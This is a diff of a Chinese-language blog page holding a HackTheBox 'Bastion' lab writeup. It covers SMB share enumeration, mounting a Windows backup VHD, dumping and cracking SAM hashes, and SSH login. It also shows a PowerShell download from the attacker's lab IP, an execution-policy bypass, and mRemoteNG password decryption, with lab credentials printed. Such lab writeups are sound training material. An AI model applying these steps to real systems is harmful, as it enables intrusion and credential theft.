@@ -1,8 +1,6 @@
-<!DOCTYPE html>
-<html>
-  <head>
+<!DOCTYPE html><html><head>
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
-  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   
   
   <title>  HTB Bastion Writeup |   Ikonw </title>
@@ -24,7 +22,7 @@
   <nav class="inner">
     <div class="title">
       <a href="/">
-        <img class="logo" src="/images/logo.png" />
+        <img class="logo" src="/images/logo.png">
       </a>
     </div>
 
@@ -122,80 +120,80 @@
 <h2 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h2><p><img src="/images/HTB-bastion/image-20200924210826254.png" alt="image-20200924210826254"></p>
 <p>正常的nmap端口扫描 没有太多的资讯，只有SMB和SSH 开着。</p>
 <h2 id="二，SMB-Enumeration"><a href="#二，SMB-Enumeration" class="headerlink" title="二，SMB Enumeration"></a>二，SMB Enumeration</h2><p>首先，利用smbclient 连接到靶机<br>方式有很多种， smbmap之类的 但我比较喜欢用简单的smbclient.<br>smbmap等其他工具在真实环境里 会自动进行大量操作，很容易被日志捕捉下来。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="/images/HTB-bastion/image-20200924210848265.png" alt="image-20200924210848265"></p>
 <p>发现四个目标，其中三个是比较正常。<br>有意思的是 <strong>Backups</strong></p>
 <p>我们利用smbclient 看看是否允许我们连接到 <strong>Backups</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></tbody></table></figure>
 
 <p>这里利用””来 逃脱 “” 所以需要4个，而backup 两个。</p>
 <p><img src="/images/HTB-bastion/image-20200924210918572.png" alt="image-20200924210918572"></p>
-<p><img src="/images/HTB-bastion/2020011001300488.png" alt="asd"></p>
+<p><img src="/images/placeholder.png" alt="asd" data-src="/images/HTB-bastion/2020011001300488.png" class="lazyload"></p>
 <p>成功进入，发现三个文件。利用 <strong>get</strong> 把 <strong>note.txt</strong> 下载到本地。<br>大概的意思就是 系统管理员建议不要把整个backup 文件夹下载到本地。<br>按照文件夹的名字来看，应该是windows镜像的备份。</p>
-<p><img src="/images/HTB-bastion/20200110013425912.png" alt="asdf"></p>
-<p>于是我尝试将整个backup都挂载到本地。<br>在本地创建文件夹 <strong>&#x2F;mnt&#x2F;backup</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></table></figure>
+<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110013425912.png" class="lazyload"></p>
+<p>于是我尝试将整个backup都挂载到本地。<br>在本地创建文件夹 <strong>/mnt/backup</strong></p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></tbody></table></figure>
 
 <p>挂载到本地并且允许读写操作</p>
-<p><img src="/images/HTB-bastion/20200110013652862.png" alt="在这asd述"></p>
+<p><img src="/images/placeholder.png" alt="在这asd述" data-src="/images/HTB-bastion/20200110013652862.png" class="lazyload"></p>
 <p>7z 有一个功能是可以让你直接读取 vhd文件的格式。我们直接来读取5gb的文件<br>(文件较大 大概2分钟左右， 文件较多就只展示一部分）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/HTB-bastion/20200110014239133.png" alt="在fdsaf"></p>
+<p><img src="/images/placeholder.png" alt="在fdsaf" data-src="/images/HTB-bastion/20200110014239133.png" class="lazyload"></p>
 <p>可以看到这是几乎整个windows的备份。<br>既然是windows备份 我们是不是可以从SAM File里面直接提取用户的帐号密码呢</p>
 <h2 id="三，用户帐号密码"><a href="#三，用户帐号密码" class="headerlink" title="三，用户帐号密码"></a>三，用户帐号密码</h2><p>7z 只是让我们看到了文件，而不能看到内容。<br>我稍微google 了一下，发现一个兄弟在medium上面有篇文章利用ghost-mount挂载虚拟硬盘。<br>linux的 ghostmount 能让我们进入虚拟硬盘的文件</p>
 <p>链接: <a target="_blank" rel="noopener" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">文章地址</a></p>
 <p>跟着大哥走<br>首先我们需要<strong>安装 libguestfs-tools</strong>这个库</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></tbody></table></figure>
 
-<p>简单的安装后，我们创建一个新的文件夹 <strong>&#x2F;mnt&#x2F;vhd</strong></p>
+<p>简单的安装后，我们创建一个新的文件夹 <strong>/mnt/vhd</strong></p>
 <p>把vhd挂载在 这个文件夹</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/HTB-bastion/20200110015004404.png" alt="在asdasd"></p>
+<p><img src="/images/placeholder.png" alt="在asdasd" data-src="/images/HTB-bastion/20200110015004404.png" class="lazyload"></p>
 <p>可以看到已经可以进入到 vhd文件里进行操作。<br>我首先要做的就是能不能直接到user desktop里拿到 user.txt</p>
 <p>samdump2可以完成这个任务</p>
-<p><img src="/images/HTB-bastion/20200110015521278.png" alt="在这asdasd"></p>
+<p><img src="/images/placeholder.png" alt="在这asdasd" data-src="/images/HTB-bastion/20200110015521278.png" class="lazyload"></p>
 <p>关于哈希值的利用方法很多，既然SMB是开着的 完全可以用哈希值传递攻击 登录系统。<br>个人原因 我比较喜欢尝试破解密码</p>
-<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">*disabled* Administrator:<span class="number">500</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">*disabled* Guest:<span class="number">501</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">L<span class="number">4</span>mpje:<span class="number">1000</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">26112010952</span>d<span class="number">963</span><span class="keyword">c</span><span class="number">8</span>dc<span class="number">4217</span>daec<span class="number">986</span>d<span class="number">9</span>:::</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">*disabled* Administrator:<span class="number">500</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">*disabled* Guest:<span class="number">501</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">31</span>d<span class="number">6</span>cfe<span class="number">0</span>d<span class="number">16</span>ae<span class="number">931</span>b<span class="number">73</span><span class="keyword">c</span><span class="number">59</span>d<span class="number">7e0</span><span class="keyword">c</span><span class="number">089</span><span class="keyword">c</span><span class="number">0</span>:::</span><br><span class="line">L<span class="number">4</span>mpje:<span class="number">1000</span>:aad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>eeaad<span class="number">3</span>b<span class="number">435</span>b<span class="number">51404</span>ee:<span class="number">26112010952</span>d<span class="number">963</span><span class="keyword">c</span><span class="number">8</span>dc<span class="number">4217</span>daec<span class="number">986</span>d<span class="number">9</span>:::</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>注意这边 administrator和 Guest显得的是 <strong>disable</strong><br>正常来说格式是<br>&lt;用户名&gt;:&lt;用户ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;留言&gt;:&lt;主目录&gt;<br>Administrator和guest的 LM HASH和NT hash都是一模一样。<br>这边要注意 aad3 和 31d6 都是代表为空说明这里没有数值<br>题外话。</p>
 <p>我们把L4mpje 的哈希值丢到crackstation.net 进行破解<br>得到帐号密码<br>L4mpje：bureaulampje</p>
-<p><img src="/images/HTB-bastion/20200110020035505.png" alt="在这sadad"></p>
+<p><img src="/images/placeholder.png" alt="在这sadad" data-src="/images/HTB-bastion/20200110020035505.png" class="lazyload"></p>
 <p>很可惜 我们没有 RDP， 但我们有SSH（狗头）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure>
 
-<p>成功拿到 cmd shell<br><img src="/images/HTB-bastion/20200110020241609.png" alt="在这里插入图片描述"><br><img src="/images/HTB-bastion/20200110020309865.png" alt="在这里插入图片描述"><br>现在开始准备提权。<br>碰到windows 我个人习惯是上JAWL 的脚本来看系统的信息来帮助我提权。</p>
+<p>成功拿到 cmd shell<br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020241609.png" class="lazyload"><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020309865.png" class="lazyload"><br>现在开始准备提权。<br>碰到windows 我个人习惯是上JAWL 的脚本来看系统的信息来帮助我提权。</p>
 <p>链接: <a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">Jawl github地址</a></p>
 <p>因为这是我的第一个文章 我就简单的说下 如何在windows里传输文件<br>其实方式有很多种，<br>有的情况这个可以 有的情况那个可以<br>我就简单说一下 我个人喜爱的一个方法。<br><strong>powershell</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1&#x27;,&#x27;C:\Users\L4mpje\Desktop\jaws-enum.ps1&#x27;)</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -c <span class="string">"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1','C:\Users\L4mpje\Desktop\jaws-enum.ps1')</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></tbody></table></figure>
 
 <p>题外话结束</p>
 <p>执行jaws-enum.ps1</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></tbody></table></figure>
 
-<p>大概的看了下 并没有什么有趣的信息，但有一个地方引起了关注<br><strong>mRemoteNG</strong><br><img src="/images/HTB-bastion/20200110020826900.png" alt="在这里插入图片描述"></p>
-<h2 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h2><p>碰到陌生的软件就要上Google询问，果然我们发现了这软件存在比较弱的密码保护管理。<br><img src="/images/HTB-bastion/20200110021000221.png" alt="在这里插sad"><br>在另外一篇文章里 我们发现了储存密码的目录 是位于Appdata里。</p>
+<p>大概的看了下 并没有什么有趣的信息，但有一个地方引起了关注<br><strong>mRemoteNG</strong><br><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110020826900.png" class="lazyload"></p>
+<h2 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h2><p>碰到陌生的软件就要上Google询问，果然我们发现了这软件存在比较弱的密码保护管理。<br><img src="/images/placeholder.png" alt="在这里插sad" data-src="/images/HTB-bastion/20200110021000221.png" class="lazyload"><br>在另外一篇文章里 我们发现了储存密码的目录 是位于Appdata里。</p>
 <p>链接:<a target="_blank" rel="noopener" href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">文章传送门</a></p>
-<p><img src="/images/HTB-bastion/20200110021043792.png" alt="asdf"><br>这里再说点题外话。<br>Appdata属于隐藏的文件夹类型 正常的dir 是无法看见文件夹</p>
-<p><img src="/images/HTB-bastion/20200110021237568.png" alt="sadfasdfaf"></p>
-<p>利用 <strong>dir&#x2F;a</strong> 来显示全部的文件</p>
-<p><img src="/images/HTB-bastion/20200110021316395.png" alt="asdf"></p>
+<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021043792.png" class="lazyload"><br>这里再说点题外话。<br>Appdata属于隐藏的文件夹类型 正常的dir 是无法看见文件夹</p>
+<p><img src="/images/placeholder.png" alt="sadfasdfaf" data-src="/images/HTB-bastion/20200110021237568.png" class="lazyload"></p>
+<p>利用 <strong>dir/a</strong> 来显示全部的文件</p>
+<p><img src="/images/placeholder.png" alt="asdf" data-src="/images/HTB-bastion/20200110021316395.png" class="lazyload"></p>
 <p>成功找到管理员的密码</p>
-<p><img src="/images/HTB-bastion/20200110021405254.png" alt="a"></p>
+<p><img src="/images/placeholder.png" alt="a" data-src="/images/HTB-bastion/20200110021405254.png" class="lazyload"></p>
 <p>利用github上面的一个python 脚本 来算出密码</p>
 <p>链接:github传送门</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;</span></span><br><span class="line"></span><br><span class="line">成功取得密码</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="</span></span><br><span class="line"></span><br><span class="line">成功取得密码</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/images/HTB-bastion/20200110021514274.png" alt="在这里插入图片描述"></p>
+<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110021514274.png" class="lazyload"></p>
 <p>紧接着 SSH登陆管理员 并拿到root.txt</p>
-<p><img src="/images/HTB-bastion/20200110021619237.png" alt="在这里插入图片描述"></p>
-<br/>
-<br/>
-<br/>
+<p><img src="/images/placeholder.png" alt="在这里插入图片描述" data-src="/images/HTB-bastion/20200110021619237.png" class="lazyload"></p>
+<br>
+<br>
+<br>
 
-<p><img src="/images/root.gif" alt="root"></p>
+<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
   	
 					
 	  </div>     
@@ -224,25 +222,31 @@
         <li class="iconfont 
 		icon-share-weixin 
 		-mob-share-weixin 
-		item"
-		></li>		
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-weibo 
+		-mob-share-weibo 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-facebook 
+		-mob-share-facebook 
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-twitter 
 		-mob-share-twitter 
-		item"
-		></li>		
+		item"></li>		
    	   			             
         <li class="iconfont 
 		icon-share-google 
 		-mob-share-google 
-		item"
-		></li>		
+		item"></li>		
    	   
 </ul>	
 
-<script id="-mob-share" 
-src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
       
     </div>
   </div>
@@ -285,7 +289,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 
     <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
 
-    <script src='//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js'></script>
+    <script src="//unpkg.com/valine@v1.1.8-beta/dist/Valine.min.js"></script>
 
     <script>
         new Valine({
@@ -311,10 +315,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
   
     <div class="none" id="search">
     <div class="header">
-        <input type="text" 
-        placeholder="Typing Something here." 
-        id="search-input" 
-        class="input" />
+        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
         
         <i id="search-cancel" class="iconfont icon-cancel"></i>
     </div>
@@ -324,7 +325,7 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
      <div class="mobile-menu">      
 
       
-      <img class="mobile-menu-icon" src= "/images/favicon.png" >  
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/favicon.png">  
       
 
          
@@ -371,14 +372,14 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
 <footer class="footer">
 	<div class="inner">
 		<div class="copyright">
-			&copy;
+			©
 			
-			2019 -
+			2020 -
 			
 			2023
 			Ikonw
 
-			<br/>
+			<br>
 			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
 		</div>
 	</div>
@@ -387,5 +388,5 @@ src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></scrip
     
 <script src="/nayo.bundle.js"></script>
            
-  </body>        
-</html>
+          
+</body></html>
